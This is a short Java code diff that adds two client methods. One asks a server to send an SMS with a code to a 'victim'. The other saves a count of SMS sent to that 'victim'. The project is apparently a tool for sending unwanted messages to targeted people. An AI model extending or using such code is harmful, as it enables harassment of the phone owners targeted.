@@ -255,4 +255,20 @@ public class User extends Client {
         sendMessage(query);
     }
 
+    void sendSendSms(String code, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "send.sms");
+        query.put("code", code);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
+    void sendSaveSmsLog(long smsCount, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "save.sms.log");
+        query.put("smsCount", smsCount);
+        query.put("victim", victim);
+        sendMessage(query);
+    }
+
 }
